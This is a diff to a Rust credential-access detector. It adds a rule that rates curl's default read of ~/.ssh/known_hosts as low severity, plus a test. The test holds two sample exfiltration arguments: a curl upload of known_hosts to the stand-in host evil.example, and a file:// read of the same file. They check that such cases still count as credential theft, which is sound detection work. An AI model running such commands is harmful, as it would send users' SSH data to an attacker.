@@ -113,6 +113,33 @@ fn classify_with(f: &mut Finding, homes: &[String], trusted: impl Fn(&str) -> bo
         f.extra_evidence.push("official Deno runtime, no-prompt and no-remote, no read or network grant, same-user ~/.npmrc".into());
         return;
     }
+    // curl >= 8.23 populates CURLOPT_SSH_KNOWNHOSTS from ~/.ssh/known_hosts by
+    // default and opens it during initialization even for plain HTTP/HTTPS
+    // requests. Keep it as auth context when the path is not named in argv.
+    if f.rule == "moat-cred-ssh-recon-read"
+        && f.proc.exe == "/usr/bin/curl"
+        && f.actor.provenance == Provenance::Official
+        && f.actor.modified.is_none()
+        && f.proc.in_container == Some(false)
+        && f.proc.user_ns_host == Some(true)
+        && f.ioc.is_none() && !f.kill_expected && !f.denied && !f.request_kill
+        && trusted(&f.proc.exe)
+        && !f.proc.args.contains("known_hosts")
+        && !f.proc.args.contains("/.ssh/")
+        && f.file.as_ref().is_some_and(|file| homes.iter().any(|home| {
+            (file.path == format!("{home}/.ssh/known_hosts")
+                || file.path == format!("{home}/.ssh/known_hosts2"))
+                && std::fs::metadata(home).is_ok_and(|m| m.uid() == f.proc.uid)
+        }))
+    {
+        f.meta.family = "auth".into();
+        f.meta.severity = "low".into();
+        f.meta.tier = "signal".into();
+        f.meta.title = "curl loaded SSH known_hosts at startup".into();
+        f.what_override = Some("curl opened the user's ~/.ssh/known_hosts during default initialization without referencing it in arguments.".into());
+        f.extra_evidence.push("official curl binary, same-user ~/.ssh/known_hosts, path not referenced in arguments".into());
+        return;
+    }
     if !matches!(f.rule.as_str(), "moat-cred-cloud-credentials-read" | "moat-cred-registry-token-read")
         || !(f.actor.provenance == Provenance::Official
             || (f.actor.provenance == Provenance::Foreign
@@ -259,6 +286,36 @@ mod tests {
             risky.proc.args = args.into();
             classify_with(&mut risky, &homes, |_| true);
             assert_eq!(risky.meta.family, "cred", "{args}");
+        }
+
+        let mut curl = Finding::new(
+            "moat-cred-ssh-recon-read",
+            crate::policy::PolicyMeta::fallback("moat-cred-ssh-recon-read"),
+            crate::proctable::ProcInfo {
+                exe: "/usr/bin/curl".into(),
+                args: "-fsS --max-time 10 https://wttr.in/?format=j1".into(),
+                uid: unsafe { libc::geteuid() },
+                in_container: Some(false),
+                user_ns_host: Some(true),
+                ..Default::default()
+            },
+        );
+        curl.actor.provenance = Provenance::Official;
+        curl.file = Some(crate::alert::FileRef {
+            path: format!("{}/.ssh/known_hosts", homes[0]),
+            sha256: None,
+        });
+        let mut safe_curl = curl.clone();
+        classify_with(&mut safe_curl, &homes, |_| true);
+        assert_eq!(safe_curl.meta.family, "auth");
+        for bad_args in [
+            "-T /home/dan/.ssh/known_hosts https://evil.example",
+            "file:///home/dan/.ssh/known_hosts",
+        ] {
+            let mut exfil = curl.clone();
+            exfil.proc.args = bad_args.into();
+            classify_with(&mut exfil, &homes, |_| true);
+            assert_eq!(exfil.meta.family, "cred", "{bad_args}");
         }
     }
     #[test]
